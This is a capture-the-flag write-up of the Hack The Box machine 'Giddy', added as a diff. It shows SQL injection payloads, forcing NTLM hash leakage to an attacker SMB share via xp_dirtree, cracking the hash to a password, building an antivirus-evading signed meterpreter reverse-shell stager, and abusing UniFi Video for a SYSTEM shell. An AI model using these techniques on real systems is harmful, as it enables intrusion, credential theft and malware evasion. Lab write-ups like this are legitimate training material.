@@ -1,0 +1,417 @@
+---
+layout: default
+title: Giddy
+---
+
+<div class="pretty-font">
+<h1>Giddy</h1>
+<p class="date">X/X/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/giddy.png">
+
+<p>This is a very interesting box which requires a SMBRelay attack through a MSSQL connection to obtain a user shell and to escalate privileges we will need to some AV bypassing to make our exploit work.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run a <code>nmap</code> to list versions and execute default scripts to see ports <code>80</code>, <code>443</code> and <code>3389</code> are opened.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# nmap -sC -sV 10.10.10.104
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-04 10:08 UTC
+Nmap scan report for 10.10.10.104
+Host is up (0.079s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+|_ssl-date: 2019-02-04T10:08:33+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2019-02-03T04:29:07
+|_Not valid after:  2019-08-05T04:29:07
+|_ssl-date: 2019-02-04T10:08:33+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.44 seconds
+</pre>
+
+<p>In the default page of the IIS server we have the following picture on both port <code>http</code> and <code>https</code>.</p> 
+
+<img class="img-fluid" src="/static/img/htb/giddy/1.png">
+
+<p>We are going to run <code>gobuster</code> with SecLists' <code>raft-small-directories.txt</code> wordlist to try to find something in the web server.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# /opt/gobuster/gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.10.104/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.104/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/05 09:25:55 Starting gobuster
+=====================================================
+/aspnet_client (Status: 301)
+/remote (Status: 302)
+/Aspnet_client (Status: 301)
+/mvc (Status: 301)
+/aspnet_Client (Status: 301)
+/Remote (Status: 302)
+=====================================================
+2019/02/05 09:29:20 Finished
+=====================================================
+</pre>
+
+<p>We have a PowerShell login panel on <code>/remote</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/2.png">
+
+<p>And some kind of inventory in <code>/mvc</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/3.png">
+
+<p>When clicking on any of those items we get redirected to a more detailed view of the product.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/4.png">
+
+<p>The URL has the following structure: <code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18</code>. If we change that ID and add special characters like <code>18'</code> we get the following SQL error.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/5.png">
+
+<p>This might mean we can exploit a SQLi in that parameter, so let's use <code>sqlmap</code> to find it out.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.2.12#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+...
+sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
+---
+Parameter: ProductSubCategoryId (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ProductSubCategoryId=18 AND 8664=8664
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: ProductSubCategoryId=18 AND 4450 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (4450=4450) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7751=7751) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: ProductSubCategoryId=18;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: ProductSubCategoryId=18 WAITFOR DELAY '0:0:5'
+---
+[09:41:09] [INFO] testing Microsoft SQL Server
+[09:41:09] [INFO] confirming Microsoft SQL Server
+[09:41:10] [INFO] the back-end DBMS is Microsoft SQL Server
+...
+</pre>
+
+<p>The page is vulnerable and is running a <code>MSSQL</code> as DBMS.</p>
+
+<p>We can dump the database information, but this takes a really long time and I didn't found anything interesting, because those credit card numbers are fake unfortunately.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 --dump
+...
++--------------+---------+----------+---------------+----------------+------------------------+
+| CreditCardID | ExpYear | ExpMonth | CardType      | CardNumber     | ModifiedDate           |
++--------------+---------+----------+---------------+----------------+------------------------+
+| 11935        | 2006    | 11       | SuperiorCard  | 11111000471254 | Aug 30 2007 12:00AM    |
+| 12094        | 2005    | 8        | Distinguish   | 11111002034157 | Jan \xa06 2008 12:00AM |
+| 10246        | 2005    | 7        | ColonialVoice | 11111005230447 | Feb 15 2008 12:00AM    |
+| 3009         | 2006    | 7        | ColonialVoice | 11111007955171 | Jun 21 2007 12:00AM    |
+...
+</pre>
+
+<p>Now that we have control of the database, what we're going to do is make the Giddy machine connect to us through <code>SMB</code> to get the <code>NTLM</code> hash of the user.</p>
+
+<p>First of all, start <code>smbserver</code> module from <code>impacket</code> to set up a SMB share in our machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# /opt/impacket/examples/smbserver.py caca /pipi
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</pre>
+
+<p>Then use <code>sqlmap</code> again to start a <code>sql-shell</code> in Giddy.
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 --sql-shell
+...
+sql-shell> 
+</pre>
+
+<p>Once inside, we can run the following command to initiate a connection to the SMB share we have just created in our machine.</p>
+
+<pre class="prettyprint">
+sql-shell> EXEC master..xp_dirtree '\\10.10.16.35\caca'
+</pre>
+
+<p>If we check the <code>smbshare</code> output we can see the <code>NTLM</code> hash of the user <code>GIDDY\Stacy</code>.</p>
+
+<pre class="prettyprint">
+[*] Incoming connection (10.10.10.104,49781)
+[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
+[*] User Stacy\GIDDY authenticated successfully
+[*] Stacy::GIDDY:4141414141414141:4edf58c83b130168f90c5b9326c31244:010100000000000000babd486fbdd40101fc3192d02de35000000000010010006f0071006e00580068006c0066006300020010004800520057005100430070006c005700030010006f0071006e00580068006c0066006300040010004800520057005100430070006c0057000700080000babd486fbdd401060004000200000008003000300000000000000000000000003000002ec7b345bd46499b56b5c2fc37f09f668bc815d35dd07b3f192688f111c10a0a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0033003500000000000000000000000000
+[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
+[*] User Stacy\GIDDY authenticated successfully
+[*] Stacy::GIDDY:4141414141414141:265ce91e9fc10b1288af1330b4dfa784:010100000000000000babd486fbdd40114ba6b9df9d51e1800000000010010006f0071006e00580068006c0066006300020010004800520057005100430070006c005700030010006f0071006e00580068006c0066006300040010004800520057005100430070006c0057000700080000babd486fbdd401060004000200000008003000300000000000000000000000003000002ec7b345bd46499b56b5c2fc37f09f668bc815d35dd07b3f192688f111c10a0a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0033003500000000000000000000000000
+</pre>
+
+<p>We can use <code>hashcat</code> to crack the obtained hash and get the real password <code>xNnWo6272k7x</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# hashcat -m 5600 ntlm /usr/share/wordlists/rockyou.txt --force
+...
+STACY::GIDDY:4141414141414141:8fb6db9998908fed4f1de19c791dd4ae:010100000000000080e1c72540bdd4013ed303d26c5b0876000000000100100076005a006500680071006f0072005700020010004c007500440063004c005700740044000300100076005a006500680071006f0072005700040010004c007500440063004c005700740044000700080080e1c72540bdd4010600040002000000080030003000000000000000000000000030000017ff5a3fd3da3c7bdf30a3e6cc9bd6afc10bcacf578d4f1debf2d2cf690905850a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0033003500000000000000000000000000:xNnWo6272k7x
+</pre>
+
+<p>With those credentials, now we can connect to the login panel we saw before on <code>https://10.10.10.104/remote/</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/6.png">
+
+<p>Inside, we have a <code>PowerShell</code> shell we can use to execute commands.</p>
+
+<img class="img-fluid" src="/static/img/htb/giddy/7.png">
+
+<p>Under Stacy's Desktop we have the user flag.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Stacy\Desktop> type user.txt
+<span flag="10C1C275385280605E96ADD808C1A0AD">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>After some enumeration we can see what could be an interesting program installed in the machine, <code>UniFi Video</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Stacy\Documents> dir 
+
+    Directory: C:\Users\Stacy\Documents
+
+Mode                LastWriteTime         Length Name                                                                  
+
+----                -------------         ------ ----                                                                  
+
+-a----        6/17/2018   9:36 AM              6 unifivideo                                                            
+</pre>
+
+<p>And of course, there are some exploits for that program.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/giddy# searchsploit unifi video
+------------------------------------------------ ----------------------------------------
+ Exploit Title                                  |  Path
+                                                | (/usr/share/exploitdb/)
+------------------------------------------------ ----------------------------------------
+Ubiquiti Networks UniFi Video Default - 'crossd | exploits/php/webapps/39268.java
+Ubiquiti UniFi Video 3.7.3 - Local Privilege Es | exploits/windows/local/43390.txt
+------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+</pre>
+
+<p>We're going to try to use <code>Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation</code> exploit to escalate privileges.</p>
+
+<p>As the txt explains, this vulnerability consists in that upon start and stop of the service, it tries to load and execute the file at <code>C:\ProgramData\unifi-video\taskkill.exe</code> and by copying an arbitrary exe there, it is possible to execute it as <code>NT AUTHORITY/SYSTEM</code>.</p>
+
+<p>What we're going to do is create a malicious exe which will create reverse shell to our local machine. To start, check the system architecture.</p>
+
+<pre class="prettyprint">
+PS C:\ProgramData\unifi-video> $ENV:PROCESSOR_ARCHITECTURE
+AMD64
+</pre>
+
+<p>The problem here is that the anti virus blocks and removes our executables, so we will have to bypass it.</p>
+
+<pre class="prettyprint">
+PS C:\ProgramData\unifi-video> Get-FileHash taskkill.exe
+Get-FileHash : The file 'C:\ProgramData\unifi-video\taskkill.exe' cannot be read: Operation did not complete 
+successfully because the file contains a virus or potentially unwanted software.
+
+    + CategoryInfo          : ReadError: (C:\ProgramData\unifi-video\taskkill.exe:PSObject) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : FileReadError,Get-FileHash
+</pre>
+
+<p>To accomplish the bypass I used <a href="https://github.com/oddcod3/Phantom-Evasion">Phantom-Evasion</a> to create a <code>meterpreter</code> stager using all the default options, which create multiple processes, strip and sign the executable to difficult the detection.</p>
+
+<pre class="prettyprint long">
+[1] Windows modules -> [2] Stager -> [2] X64 stagers -> [1] C x64/meterpreter/reverse_TCP VirtualAlloc 
+
+====
+
+[>] Please insert LHOST: 10.10.16.35
+
+[>] Please insert LPORT: 6969
+
+[>] Please insert output filename: taskkill
+
+[>] Spawn Multiple Processes:
+
+During target-side execution this will cause to spawn a maximum of 4 processes
+consequentialy.
+
+Only the last spawned process will reach the malicious section of code
+while the other decoy processes spawned before will executes only random junk code
+
+[>] Add multiple processes behaviour?(y/n): y
+
+[>] Insert number of decoy processes (integer between 1-3): 2
+
+[>] Generating C meterpreter stager
+
+
+[>] Compiling...
+
+
+[>] Strip 
+
+strip is a GNU utility to "strip" symbols from object files.
+
+This is useful for minimizing their file size, streamlining them for distribution.
+
+It can also be useful for making it more difficult to reverse-engineer the compiled code.
+
+(Lower rate of detection)
+
+
+[>] Strip executable? (y/n):y
+
+[>] Stripping...
+
+
+[>] Sign Executable 
+
+Online Certificate spoofer & Executabe signer (Lower rate of detection)
+
+
+[>] Sign executable? (y/n):y
+
+[>] Insert certificate spoofing target (default: www.microsoft.com:443): 
+
+[>] Insert sign software description (default: Notepad Benchmark Util): 
+
+[>] Signing taskkill.exe with osslsigncode...
+
+[>] Succeeded
+
+
+[&lt;>] File saved in Phantom-Evasion folder
+</pre>
+
+<p>To listen for the <code>meterpreter</code> session use <code>msfconsole</code> <code>exploit/multi/handler</code> module with <code>windows/x64/meterpreter/reverse_tcp</code> as payload, specifying our IP and the port selected before.</p>
+
+<pre class="prettyprint">
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.35      yes       The listen address (an interface may be specified)
+   LPORT     6969             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.35:6969 
+</pre>
+
+<p>Now as the description of the exploit says, we have to put our exe on <code>C:\ProgramData\unifi-video\taskkil.exe</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Stacy\Documents> cd C:\ProgramData\unifi-video
+PS C:\ProgramData\unifi-video> wget http://10.10.16.35/taskkill.exe -UseBasicParsing -OutFile taskkill.exe
+</pre>
+
+<p>Restart the service and the exe should be automatically executed.</p>
+
+<pre class="prettyprint">
+PS C:\ProgramData\unifi-video> Restart-Service -Name "Ubiquiti UniFi Video"
+</pre>
+
+<p>On <code>msfconsole</code> we should see a meterpreter session from Giddy has been opened as <code>nt authority\system</code>.</p>
+
+<pre class="prettyprint">
+[*] Sending stage (206403 bytes) to 10.10.10.104
+[*] Meterpreter session 4 opened (10.10.16.35:6969 -> 10.10.10.104:49909) at 2019-02-05 15:46:11 +0000
+
+meterpreter > shell
+Process 1708 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\ProgramData\unifi-video>whoami
+whoami
+nt authority\system
+</pre>
+
+<p>Root flag is on the Administrator's desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+<span flag="CF559C6C121F683BF3E56891E80641B1">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
